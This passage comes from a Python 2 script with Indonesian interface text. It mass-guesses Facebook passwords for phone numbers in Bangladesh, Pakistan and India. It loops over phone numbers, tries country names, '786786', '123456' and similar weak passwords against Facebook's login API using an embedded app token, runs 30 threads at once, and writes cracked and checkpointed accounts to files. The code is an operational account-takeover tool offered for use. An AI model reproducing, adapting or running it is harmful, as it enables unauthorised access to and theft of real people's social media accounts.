                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass4
                            okb = open('save/ind.txt', 'a')
                            okb.write('[Berhasil] ' + k + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass4
                            cps = open('save/ind.txt', 'a')
                            cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = 'Memek123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass5
                                okb = open('save/ind.txt', 'a')
                                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass5
                                cps = open('save/ind.txt', 'a')
                                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = 'Cinta123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'access_token' in w:
                                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass6
                                    okb = open('save/ind.txt', 'a')
                                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass6 + '\n')
                                    okb.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass6
                                    cps = open('save/ind.txt', 'a')
                                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass6 + '\n')
                                    cps.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Iloveyou123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'access_token' in w:
                                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass7
                                        okb = open('save/ind.txt', 'a')
                                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass7 + '\n')
                                        okb.close()
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in w['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass7
                                        cps = open('save/ind.txt', 'a')
                                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass7 + '\n')
                                        cps.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '123456'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'access_token' in w:
                                            print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass8
                                            okb = open('save/ind.txt', 'a')
                                            okb.write('[Berhasil] ' + k + c + user + ' | ' + pass8 + '\n')
                                            okb.close()
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in w['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass8
                                            cps = open('save/ind.txt', 'a')
                                            cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass8 + '\n')
                                            cps.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            pass9 = 'Cinta123'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'access_token' in w:
                                                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass9
                                                okb = open('save/ind.txt', 'a')
                                                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass9 + '\n')
                                                okb.close()
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\x1b[1;97m[\x1b[1;93mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass9
                                                cps = open('save/ind.txt', 'a')
                                                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass9 + '\n')
                                                cps.close()
                                                cekpoint.append(user + pass9)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Selesai'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mHACK\x1b[1;97m/\x1b[1;93mCHECK \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/ind.txt'
    print 50 * '\x1b[1;97m~'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 contoh.py')


def bangla():
    os.system('clear')
    print logo2
    print '\x1b[1;92m    191-192-193-194-195-196-197-198-199'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Pilih Nomor \x1b[1;97m :\x1b[1;92m ')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Masukan 3 Digit Angka') if len(c) < 3 else ''
        k = '+880'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Nomor \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mJangan Keluar')
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Sedang Berlangsung' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/bangla1.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/bangla1.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' \xe2\x88\x86 ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/bangla1.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/bangla1.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Bangladesh'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/bangla1.txt', 'a')
                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/bangla1.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Selesai ....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/bangla1.txt'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 contoh.py')


def pakistan():
    os.system('clear')
    print logo2
    print '\x1b[1;92m    355-334-335-336-337-338-339-351-352'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Pilih Nomor \x1b[1;97m :\x1b[1;92m')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Masukan 3 Digit Angka') if len(c) < 3 else ''
        k = '+92'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Kembali ]')
        rizky4()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mJangan Keluar')
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Sedang Berlangsung ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/pakistan.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/pakistan.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '786786'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass2
                    okb = open('save/pakistan.txt', 'a')
                    okb.write('[Berhasil] ' + k + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass2
                    cps = open('save/pakistan.txt', 'a')
                    cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = 'Pakistan'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass3
                        okb = open('save/pakistan.txt', 'a')
                        okb.write('[Berhasil] ' + k + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass3
                        cps = open('save/pakistan.txt', 'a')
                        cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Selesai.....'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/pakistan.txt'
    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
    os.system('python2 contoh.py')


def india():
    os.system('clear')
    print logo2
    print '\x1b[1;92m       905-755-995-855-935-965-975'
    print 50 * '\x1b[1;97m~'
    try:
        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Pilij Nomor \x1b[1;97m :\x1b[1;92m')
        exit('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m]\x1b[1;91m Kode Wajib 3 Digit !!') if len(c) < 3 else ''
        k = '+91'
        idlist = '.txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] File Tidak Ditemukan'
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Number \x1b[1;97m:\x1b[1;92m ' + xxx)
    time.sleep(0.5)
    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mDon't close")
    time.sleep(0.5)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Crack Running ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + k + c + user + ' \x1b[1;92m|\x1b[1;97m ' + pass1
                okb = open('save/india.txt', 'a')
                okb.write('[Berhasil] ' + k + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + k + c + user + ' \x1b[1;93m|\x1b[1;97m ' + pass1
                cps = open('save/india.txt', 'a')
                cps.write('[Cekpoint] ' + k + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
